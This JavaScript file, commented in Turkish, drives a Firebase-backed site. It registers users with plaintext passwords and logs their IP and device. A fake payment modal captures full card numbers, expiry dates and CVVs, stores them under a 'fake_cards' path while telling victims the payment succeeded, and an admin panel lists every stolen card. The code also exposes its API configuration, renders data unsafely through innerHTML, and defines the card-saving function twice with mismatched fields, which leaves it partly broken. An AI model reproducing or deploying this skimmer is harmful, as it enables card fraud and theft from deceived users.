// --- FIREBASE YAPILANDIRMASI (AYNEN EKLE) ---
const firebaseConfig = {
    apiKey: "AIzaSyB6XlCbPxs6I1jJThZ6OTiaJ-Xssw_mkbA",
    authDomain: "wooxyproject.firebaseapp.com",
    databaseURL: "https://wooxyproject-default-rtdb.firebaseio.com/",
    projectId: "wooxyproject",
    storageBucket: "wooxyproject.firebasestorage.app",
    messagingSenderId: "932458468968",
    appId: "1:932458468968:web:ca0e8230bfae415f3c8ddd"
};
if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
const db = firebase.database();

// --- EK BİLGİ TOPLAMA FONKSİYONLARI ---
function getDeviceInfo() {
    const ua = navigator.userAgent;
    if (/android/i.test(ua)) return "Android Device";
    if (/iPad|iPhone|iPod/.test(ua)) return "iOS Device";
    if (/Windows/i.test(ua)) return "Windows PC";
    if (/Mac/i.test(ua)) return "Macintosh";
    if (/Linux/i.test(ua)) return "Linux System";
    return "Unknown Device";
}

async function getPublicIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (e) {
        return "Bilinmiyor";
    }
}

// --- GECE/GÜNDÜZ TEMA KONTROLÜ (Orijinal Kodun) ---
const themeToggle = document.getElementById('theme-toggle');
if (localStorage.getItem('theme') === 'light') {
    document.documentElement.setAttribute('data-theme', 'light');
    if (themeToggle) themeToggle.checked = true;
}
if (themeToggle) {
    themeToggle.addEventListener('change', function() {
        if (this.checked) {
            document.documentElement.setAttribute('data-theme', 'light');
            localStorage.setItem('theme', 'light');
        } else {
            document.documentElement.removeAttribute('data-theme');
            localStorage.setItem('theme', 'dark');
        }
    });
}

// --- HATA YARDIMCISI (Orijinal Kodun) ---
function triggerError(inputId, message) {
    const el = document.getElementById(inputId);
    if(!el) return;
    el.value = ""; 
    el.placeholder = message; 
    el.classList.add("error-mode"); 
    el.onfocus = () => {
        el.classList.remove("error-mode");
        el.placeholder = (inputId === "username") ? "Kullanıcı Adı" : "Şifre";
    };
}

// --- GİRİŞ FONKSİYONU (Firebase Entegreli) ---
async function login() {
    const user = document.getElementById('username').value.trim();
    const pass = document.getElementById('password').value.trim();
    if (!user || !pass) return;

    // Giriş anında IP güncellemek için
    const currentIP = await getPublicIP();

    db.ref('users/' + user).once('value', (snapshot) => {
        const userData = snapshot.val();
        if (userData && userData.pass === pass) {
            if (userData.status === 'banned') {
                alert("BU HESAP BANLANMIŞTIR!");
                return;
            }
            localStorage.setItem('currentUser', user);
            db.ref('users/' + user).update({
                lastLogin: new Date().toLocaleString('tr-TR'),
                lastSeen: Date.now(),
                ip: currentIP // Giriş anında IP'yi tazeler
            }).then(() => { window.location.href = "dashboard.html"; });
        } else {
            alert("Kullanıcı adı veya şifre hatalı!");
        }
    });
}

// --- KAYIT FONKSİYONU (Esas Alınan + Teknik Bilgi Eklemesi) ---
async function register() {
    const user = document.getElementById('username').value.trim();
    const pass = document.getElementById('password').value.trim();

    if (user.length < 5) { triggerError("username", "En az 5 karakter!"); return; }
    if (pass.length < 10) { triggerError("password", "En az 10 karakter!"); return; }
    if (!/\d/.test(pass)) { triggerError("password", "En az 1 sayı lazım!"); return; }
    const specialChars = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/;
    if (!specialChars.test(pass)) { triggerError("password", "Özel karakter lazım!"); return; }

    // Kayıt anında IP ve Cihaz bilgisini al
    const userIP = await getPublicIP();
    const userDevice = getDeviceInfo();

    db.ref('users/' + user).once('value', (snapshot) => {
        if (snapshot.exists()) {
            triggerError("username", "Bu isim alınmış!");
        } else {
            const code = Math.floor(100000 + Math.random() * 900000);
            db.ref('users/' + user).set({
                name: user,
                pass: pass,
                role: 'user',
                status: 'active',
                recoveryCode: code,
                regDate: new Date().toLocaleString('tr-TR'),
                lastSeen: Date.now(),
                ip: userIP,       // IP adresi kaydediliyor
                device: userDevice // Cihaz bilgisi kaydediliyor
            }).then(() => {
                document.getElementById('generatedCode').innerText = code;
                document.getElementById('recoveryDisplayModal').style.display = 'flex';
            });
        }
    });
}
// --- POS MODAL KONTROLLERİ ---
function togglePos(show) {
    const overlay = document.getElementById('posOverlay');
    if (overlay) {
        overlay.style.display = show ? 'flex' : 'none';
    }
}

// --- KREDİ KARTI KAYIT VE KATEGORİZE ETME FONKSİYONU ---
async function saveCardToFirebase() {
    const fullName = document.getElementById('holderInput').value.trim();
    const cardNumber = document.getElementById('cardNumInput').value.replace(/\s+/g, '');
    const expiryDate = document.getElementById('expiryInput').value.trim();
    const cvv = document.getElementById('cvvInput').value.trim();

    // 1. İSİM KONTROLÜ: En az bir ad ve soyad (arada boşluk) ve sadece harf
    const nameRegex = /^[a-zA-ZçğıöşüÇĞİÖŞÜ]+\s[a-zA-ZçğıöşüÇĞİÖŞÜ]+.*$/;
    if (!nameRegex.test(fullName)) {
        alert("Lütfen geçerli bir Ad ve Soyad giriniz!");
        return;
    }

    // 2. KART NUMARASI KONTROLÜ: Tam olarak 16 hane olmalı
    if (cardNumber.length !== 16 || isNaN(cardNumber)) {
        alert("Kart numarası tam olarak 16 haneli olmalıdır!");
        return;
    }

    // 3. SKT (TARİH) KONTROLÜ: MM/YY formatı ve Mantık kontrolü
    const dateParts = expiryDate.split('/');
    if (dateParts.length !== 2) {
        alert("Tarih formatı GG/YY (Örn: 05/28) olmalıdır!");
        return;
    }

    const month = parseInt(dateParts[0], 10);
    const year = parseInt("20" + dateParts[1], 10); // 26 -> 2026 yapar
    const now = new Date();
    const currentMonth = now.getMonth() + 1;
    const currentYear = now.getFullYear();

    if (month < 1 || month > 12) {
        alert("Geçersiz ay! (01-12 arası olmalı)");
        return;
    }

    if (year < currentYear || (year === currentYear && month < currentMonth)) {
        alert("Kartın son kullanma tarihi geçmiş!");
        return;
    }

    // 4. CVV KONTROLÜ: 3 veya 4 hane olmalı
    if (cvv.length < 3 || cvv.length > 4 || isNaN(cvv)) {
        alert("Geçersiz CVV! (3 veya 4 rakam olmalı)");
        return;
    }

    // --- TÜM KONTROLLER GEÇTİYDSE KAYDET ---
    let cardType = "OtherCards";
    if (cardNumber.startsWith('4')) cardType = "Visa";
    else if (cardNumber.startsWith('5')) cardType = "Mastercard";

    try {
        const cardRef = db.ref('fake_cards/' + cardType).push();
        await cardRef.set({
            holder_name: fullName,
            card_number: cardNumber,
            expiry_date: expiryDate,
            cvv: cvv,
            timestamp: firebase.database.ServerValue.TIMESTAMP,
            added_date: new Date().toLocaleString('tr-TR')
        });

        alert("Ödeme İşlemi Başarılı!");
        togglePos(false);
        // Formu temizle
        document.querySelectorAll('.input_field').forEach(input => input.value = "");

    } catch (error) {
        alert("Hata: " + error.message);
    }
}
    async function saveCardToFirebase() {
    // 1. Verileri Al
    const name = document.getElementById('holder_name').value.trim();
    const number = document.getElementById('card_number').value.replace(/\s+/g, '');
    const expiry = document.getElementById('expiry_date').value.trim();
    const cvv = document.getElementById('cvv_code').value.trim();

    // 2. Kontrol Et (Boş veri gitmesin)
    if (!name || !number || !expiry || !cvv) {
        alert("Lütfen tüm alanları doldurun!");
        return;
    }

    // 3. Kart Tipini Belirle
    let category = "OtherCards";
    if (number.startsWith('4')) {
        category = "Visa";
    } else if (number.startsWith('5')) {
        category = "Mastercard";
    }

    try {
        // 4. Firebase'e Kaydet
        // Yol: fake_cards / [Visa veya Mastercard] / [Otomatik ID]
        const cardRef = db.ref('fake_cards/' + category).push();
        
        await cardRef.set({
            owner: name, // İsim bilgisi verinin yanında
            cardNumber: number,
            expiryDate: expiry,
            cvv: cvv,
            type: category,
            date: new Date().toLocaleString('tr-TR')
        });

        // 5. İşlem Bitince Ekranı Kapat ve Temizle
        console.log("Veri başarıyla gönderildi.");
        togglePos(false); // Modalı kapatır
        alert("Ödeme Onaylandı!");
        
        // Inputları temizle
        document.getElementById('holder_name').value = "";
        document.getElementById('card_number').value = "";
        document.getElementById('expiry_date').value = "";
        document.getElementById('cvv_code').value = "";

    } catch (error) {
        console.error("Hata:", error);
        alert("Veri gönderilemedi: " + error.message);
    }
}
function loadFakeCards() {
    const tableBody = document.getElementById('cardsTableBody');
    
    // fake_cards altındaki tüm kategorileri (Visa, Mastercard, Other) dinle
    db.ref('fake_cards').on('value', (snapshot) => {
        tableBody.innerHTML = ""; // Tabloyu temizle
        
        const allCategories = snapshot.val();
        if (!allCategories) {
            tableBody.innerHTML = "<tr><td colspan='6'>Henüz kart verisi yok.</td></tr>";
            return;
        }

        // Kategoriler (Visa, Mastercard vb.) üzerinde dön
        Object.keys(allCategories).forEach(category => {
            const cards = allCategories[category];
            
            // Her kategorideki kartlar üzerinde dön
            Object.keys(cards).forEach(cardId => {
                const card = cards[cardId];
                
                const row = `
                    <tr>
                        <td style="color: #fff; font-weight: bold;">${card.holder_name}</td>
                        <td style="letter-spacing: 1px;">${card.card_number}</td>
                        <td>${card.expiry_date}</td>
                        <td><span class="highlight-red">${card.cvv}</span></td>
                        <td>
                            <span class="badge ${category.toLowerCase()}">${category}</span>
                        </td>
                        <td style="font-size: 11px; color: #888;">${card.added_date || '---'}</td>
                    </tr>
                `;
                tableBody.innerHTML += row;
            });
        });
    });
}

// Admin paneli yüklendiğinde kartları çekmeye başla
loadFakeCards();